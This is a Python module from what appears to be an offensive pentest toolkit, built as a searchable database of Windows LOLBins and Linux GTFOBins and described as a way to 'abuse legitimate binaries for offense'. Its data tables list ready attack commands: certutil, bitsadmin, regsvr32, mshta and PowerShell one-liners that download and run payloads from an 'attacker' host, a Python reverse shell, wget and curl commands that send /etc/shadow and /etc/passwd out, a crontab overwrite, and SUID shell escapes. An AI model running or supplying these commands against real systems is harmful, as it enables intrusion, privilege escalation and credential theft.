"""LOLBins Module - Living off the Land Binaries database for Windows and Linux (GTFOBins)."""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel, show_knowledge)
from executor import run_with_preview, run_command

STAGE = "lolbins"

WINDOWS_LOLBINS = {
    "certutil": {
        "functions": ["download", "encode", "decode"],
        "examples": {
            "Download file": "certutil -urlcache -split -f http://attacker/payload.exe C:\\Windows\\Temp\\payload.exe",
            "Base64 encode": "certutil -encode payload.exe encoded.txt",
            "Base64 decode": "certutil -decode encoded.txt payload.exe",
            "Hash file": "certutil -hashfile C:\\file.exe MD5",
        },
    },
    "mshta": {
        "functions": ["execute"],
        "examples": {
            "Run HTA": "mshta http://attacker/payload.hta",
            "Inline VBS": 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /c calc"":close")',
            "JavaScript": 'mshta javascript:a=GetObject("script:http://attacker/payload.sct").Exec()',
        },
    },
    "msbuild": {
        "functions": ["execute", "compile"],
        "examples": {
            "Build & execute": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.csproj",
            "Inline task": "MSBuild.exe payload.xml (with inline C# task)",
        },
    },
    "regsvr32": {
        "functions": ["execute", "download"],
        "examples": {
            "Remote SCT": "regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll",
            "Local DLL": "regsvr32 /s payload.dll",
        },
    },
    "rundll32": {
        "functions": ["execute"],
        "examples": {
            "Run DLL export": "rundll32.exe payload.dll,EntryPoint",
            "JavaScript": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"calc\")",
            "Control panel": "rundll32.exe shell32.dll,Control_RunDLL payload.cpl",
        },
    },
    "wmic": {
        "functions": ["execute", "recon"],
        "examples": {
            "Process create": "wmic process call create 'cmd /c payload.exe'",
            "Remote exec": "wmic /node:target process call create 'cmd /c payload.exe'",
            "XSL exec": "wmic os get /format:\"http://attacker/payload.xsl\"",
        },
    },
    "powershell": {
        "functions": ["download", "execute", "encode"],
        "examples": {
            "Download & exec": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')\"",
            "Encoded command": "powershell -EncodedCommand <base64>",
            "Bypass policy": "powershell -ep bypass -f payload.ps1",
            "Download file": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://attacker/file','C:\\temp\\file')\"",
        },
    },
    "bitsadmin": {
        "functions": ["download"],
        "examples": {
            "Download file": "bitsadmin /transfer job /download /priority high http://attacker/payload.exe C:\\Windows\\Temp\\payload.exe",
            "Create & resume": "bitsadmin /create 1 & bitsadmin /addfile 1 http://attacker/payload C:\\temp\\payload & bitsadmin /resume 1",
        },
    },
    "installutil": {
        "functions": ["execute"],
        "examples": {
            "Execute assembly": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe",
        },
    },
    "cscript/wscript": {
        "functions": ["execute", "download"],
        "examples": {
            "Run VBS": "cscript //nologo payload.vbs",
            "Run JS": "wscript payload.js",
            "Remote": "cscript //nologo \\\\attacker\\share\\payload.vbs",
        },
    },
}

LINUX_GTFOBINS = {
    "python": {
        "functions": ["shell", "reverse_shell", "file_read", "file_write", "suid"],
        "examples": {
            "Shell": "python3 -c 'import os; os.system(\"/bin/bash\")'",
            "Reverse shell": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
            "SUID shell": "python3 -c 'import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")'",
            "File read": "python3 -c 'print(open(\"/etc/shadow\").read())'",
        },
    },
    "find": {
        "functions": ["shell", "suid", "execute"],
        "examples": {
            "Shell": "find . -exec /bin/bash \\;",
            "SUID shell": "find / -exec /bin/bash -p \\; -quit",
            "Execute": "find . -exec cmd {} \\;",
        },
    },
    "vim": {
        "functions": ["shell", "file_read", "suid"],
        "examples": {
            "Shell": "vim -c ':!/bin/bash'",
            "SUID": "vim -c ':py3 import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")'",
        },
    },
    "nmap": {
        "functions": ["shell", "suid"],
        "examples": {
            "Interactive (old)": "nmap --interactive → !sh",
            "Script shell": "nmap --script <(echo 'os.execute(\"/bin/bash\")')",
        },
    },
    "wget": {
        "functions": ["download", "file_write", "exfil"],
        "examples": {
            "Download": "wget http://attacker/payload -O /tmp/payload",
            "Exfil (POST)": "wget --post-file=/etc/passwd http://attacker/",
            "Overwrite": "wget http://attacker/crontab -O /etc/crontab",
        },
    },
    "curl": {
        "functions": ["download", "exfil", "file_read"],
        "examples": {
            "Download": "curl http://attacker/payload -o /tmp/payload",
            "Exfil": "curl -X POST -d @/etc/shadow http://attacker/",
            "File read": "curl file:///etc/shadow",
        },
    },
    "tar": {
        "functions": ["shell", "suid"],
        "examples": {
            "Shell via checkpoint": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
        },
    },
    "awk": {
        "functions": ["shell", "file_read"],
        "examples": {
            "Shell": "awk 'BEGIN {system(\"/bin/bash\")}'",
            "File read": "awk '{print}' /etc/shadow",
        },
    },
}


def _search_lolbin(session):
    """Search for a specific LOLBin/GTFOBin by name."""
    name = ask("Enter binary name to search").lower().strip()
    if not name:
        error("Name required.")
        return

    found = False
    for binary, data in WINDOWS_LOLBINS.items():
        if name in binary.lower():
            found = True
            console.print(f"\n[bold cyan]Windows LOLBin: {binary}[/bold cyan]")
            console.print(f"  Functions: {', '.join(data['functions'])}")
            for desc, cmd in data['examples'].items():
                console.print(f"  [yellow]{desc}:[/yellow]")
                console.print(f"    [green]{cmd}[/green]")

    for binary, data in LINUX_GTFOBINS.items():
        if name in binary.lower():
            found = True
            console.print(f"\n[bold cyan]Linux GTFOBin: {binary}[/bold cyan]")
            console.print(f"  Functions: {', '.join(data['functions'])}")
            for desc, cmd in data['examples'].items():
                console.print(f"  [yellow]{desc}:[/yellow]")
                console.print(f"    [green]{cmd}[/green]")

    if not found:
        warning(f"No LOLBin/GTFOBin found matching '{name}'.")


def _search_by_function(session):
    """Search LOLBins by function (download, execute, shell, etc.)."""
    options = [
        ("1", "[bold]download[/bold]  - File download capabilities"),
        ("2", "[bold]execute[/bold]   - Code/command execution"),
        ("3", "[bold]shell[/bold]     - Spawn interactive shell"),
        ("4", "[bold]suid[/bold]      - SUID privilege escalation"),
        ("5", "[bold]encode[/bold]    - Encoding/obfuscation"),
        ("6", "[bold]exfil[/bold]     - Data exfiltration"),
    ]
    choice = show_menu(options)

    func_map = {"1": "download", "2": "execute", "3": "shell", "4": "suid", "5": "encode", "6": "exfil"}
    func = func_map.get(choice)
    if not func:
        return

    console.print(f"\n[bold]Binaries with '{func}' capability:[/bold]\n")

    console.print("[cyan]═══ Windows LOLBins ═══[/cyan]")
    for binary, data in WINDOWS_LOLBINS.items():
        if func in data['functions']:
            console.print(f"  [bold]{binary}[/bold]")
            for desc, cmd in data['examples'].items():
                if func.lower() in desc.lower() or True:
                    console.print(f"    [dim]{cmd}[/dim]")

    console.print(f"\n[cyan]═══ Linux GTFOBins ═══[/cyan]")
    for binary, data in LINUX_GTFOBINS.items():
        if func in data['functions']:
            console.print(f"  [bold]{binary}[/bold]")
            for desc, cmd in data['examples'].items():
                console.print(f"    [dim]{cmd}[/dim]")


def _list_all_windows(session):
    """List all Windows LOLBins."""
    from rich.table import Table
    table = Table(title="Windows LOLBins", show_header=True)
    table.add_column("Binary", style="cyan bold")
    table.add_column("Functions", style="yellow")
    table.add_column("Example Count")

    for binary, data in WINDOWS_LOLBINS.items():
        table.add_row(binary, ", ".join(data['functions']), str(len(data['examples'])))

    console.print(table)


def _list_all_linux(session):
    """List all Linux GTFOBins."""
    from rich.table import Table
    table = Table(title="Linux GTFOBins", show_header=True)
    table.add_column("Binary", style="cyan bold")
    table.add_column("Functions", style="yellow")
    table.add_column("Example Count")

    for binary, data in LINUX_GTFOBINS.items():
        table.add_row(binary, ", ".join(data['functions']), str(len(data['examples'])))

    console.print(table)


def _cheat_sheet():
    """LOLBins cheat sheet."""
    content = """# Living off the Land Cheat Sheet

## What are LOLBins?
Legitimate system binaries that can be abused for malicious purposes.
They bypass application whitelisting since they're signed by Microsoft/OS.

## Top Windows LOLBins
1. **certutil** - Download, encode/decode files
2. **mshta** - Execute HTA/VBS/JS
3. **msbuild** - Compile & execute C# inline
4. **regsvr32** - Execute remote SCT files
5. **rundll32** - Execute DLL exports
6. **wmic** - Remote process creation
7. **powershell** - Everything
8. **bitsadmin** - Stealthy file download

## Top Linux GTFOBins
1. **python** - Shell, reverse shell, file ops
2. **find** - SUID shell escape
3. **vim** - Shell from editor
4. **wget/curl** - Download & exfil
5. **tar** - Shell via checkpoint action
6. **awk** - Shell & file read

## Resources
- https://lolbas-project.github.io/ (Windows)
- https://gtfobins.github.io/ (Linux)
"""
    show_knowledge(content)


def run(session):
    """LOLBins module entry point."""
    show_stage_header("LOLBins / GTFOBins", "Living off the Land — abuse legitimate binaries for offense")

    while True:
        options = [
            ("1", "[bold]Search by Name[/bold]   - Find specific binary"),
            ("2", "[bold]Search by Function[/bold]- Filter by capability"),
            ("3", "[bold]Windows LOLBins[/bold]  - List all Windows entries"),
            ("4", "[bold]Linux GTFOBins[/bold]   - List all Linux entries"),
            ("5", "[bold]Cheat Sheet[/bold]      - LOLBins reference"),
            ("0", "[bold]Back to Main Menu[/bold]"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _search_lolbin(session)
        elif choice == "2":
            _search_by_function(session)
        elif choice == "3":
            _list_all_windows(session)
        elif choice == "4":
            _list_all_linux(session)
        elif choice == "5":
            _cheat_sheet()
